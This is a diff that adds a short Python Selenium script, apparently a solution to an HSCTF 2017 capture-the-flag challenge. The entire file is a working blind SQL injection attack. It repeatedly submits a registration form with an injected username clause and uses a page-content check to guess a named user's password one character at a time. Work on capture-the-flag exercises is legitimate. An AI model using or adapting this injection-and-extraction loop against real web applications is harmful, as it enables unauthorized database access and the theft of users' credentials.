@@ -1,0 +1,20 @@
+from selenium import webdriver
+driver = webdriver.Firefox()
+x = "the flag is: a"
+while True:
+    for a in "abcdef0123456789ghijklmnopqrstuvwxyz":
+        x = x[:-1] + a
+        driver.get("http://hsctf2017.soumil.heliohost.org/hsctf2017/keithanddawg/register.php")
+        element2 = driver.find_element_by_name("username")
+        element2.send_keys('" OR EXISTS(SELECT * FROM users WHERE username="shadyjdawg" AND password LIKE "' + x + '%") -- ')
+        element3 = driver.find_element_by_name("pw1")
+        element3.send_keys('aa')
+        element4 = driver.find_element_by_name("pw2")
+        element4.send_keys('aa')                   
+        element4.submit()
+        driver.get("http://hsctf2017.soumil.heliohost.org/hsctf2017/keithanddawg/search.php")
+        if("jakob-degen_personnel-report-official_001.jpg" in driver.page_source):
+            print(x)
+            x += "a"
+            break
+    print("rawr")
